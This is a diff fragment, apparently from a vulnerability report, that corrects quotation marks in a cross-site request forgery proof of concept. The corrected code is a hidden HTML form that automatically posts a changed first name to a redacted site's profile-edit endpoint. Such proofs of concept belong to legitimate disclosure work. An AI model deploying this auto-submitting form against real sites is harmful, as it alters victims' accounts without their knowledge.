@@ -555,8 +555,8 @@
 	poc: 
 		 <html>
 		  <body>
-		    <form action="https://redacted.com/profile/edit” method="POST">
-		      <input type="hidden" name=“first_”name value=“Attacker” />
+		    <form action="https://redacted.com/profile/edit" method="POST">
+		      <input type="hidden" name="first_name" value="Attacker" />
 		    </form>
 		    <script>
 		      document.forms[0].submit();
